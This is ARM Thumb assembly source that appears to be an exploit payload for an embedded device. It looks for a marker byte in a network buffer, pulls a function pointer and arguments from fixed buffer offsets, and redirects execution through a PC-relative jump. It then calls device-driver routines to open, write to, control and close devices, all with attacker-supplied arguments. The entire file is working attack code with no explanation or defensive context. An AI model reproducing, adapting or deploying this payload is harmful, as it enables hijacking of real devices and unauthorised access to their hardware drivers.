.thumb
.syntax unified
.globl _start

// detect 0xFF at lan->buf[0xFC]
// r4/r5 == lan->buf + 0xF8 == lan + 0xFC
_start:
	push {r4-r7, lr}

	// r7 = lan->buf[0xFC]
	ldr r7, [r4, #0x04]
	cmp r7, #0xFF
	beq prepare
	movs r4, r5
	nop

// r4 == lan->buf + 0xF8
prepare:
	// r4 = lan->buf + 0xEC
	subs r4, 0x0C
	// r3 = lan->buf[0xEC] - target function
	// r5 = lan->buf[0xF0] - lan->fd
	// r6 = lan->buf[0xF4] - arg stager address, PC-relative
	// r7 = lan->buf[0xF8] - DD_HANDLE storage address
	// r4 = lan->buf + 0xFC == lan + 0x100
	ldmia r4!, {r3, r5, r6, r7}
	// r8 = r3 == lan->buf[0xEC]
	mov r8, r3

	// store at lan->fd (lan + 0x144)
	str r5, [r4, #0x44]
	// set command buffer pointer (lan->buf + 0x48)
	subs r4, #0xB4

	// DD_HANDLE dd = *buf[0xF8];
	ldr r0, [r7]
	// jump to arg stager
	add pc, r6

// r4 == lan->buf + 0x48
call_proper:
	// proper(*data, *intf, command);
	// proper(buf + 0x50, buf[0x48], buf[0x4C]);
	ldmia r4!, {r1, r2}
	movs r0, r4
	b call_ddev

ddev_open:
	// ddev_open(handle, *dev_name, *status, op_flag);
	// *buf[0xF8] = ddev_open(buf + 0x50, buf[0x48], buf[0x4C]);
	ldmia r4!, {r1, r2}
	movs r0, r4
	blx r8
	str r0, [r6]
	b finish

ddev_write:
	// ddev_write(handle, *user_buf, count, addr);
	// ddev_write(*buf[0xF8], buf + 0x50, buf[0x48], buf[0x4C]);
	ldmia r4!, {r2, r3}
	movs r1, r4
	b call_ddev

ddev_control:
	// ddev_control(handle, cmd, *param);
	// ddev_control(*buf[0xF8], buf[0x48], buf + 0x4C);
	ldmia r4!, {r1}
	movs r2, r4

ddev_close:
	// ddev_close(handle);
	// ddev_close(*buf[0xF8]);

call_ddev:
	blx r8

finish:
	pop {r4-r7, pc}
